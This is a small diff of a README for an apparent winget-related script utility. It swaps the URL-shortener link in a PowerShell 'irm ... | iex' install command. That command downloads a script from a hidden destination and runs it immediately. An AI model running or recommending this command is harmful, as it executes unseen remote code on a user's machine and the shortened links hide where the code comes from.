@@ -8,5 +8,5 @@ This can work with any script utility that supports winget installation method.
 ## The command to run
 
 ```powershell
-irm https://v.gd/e7zG3e | iex
+irm https://tinyurl.com/yom54hfu | iex
 ```
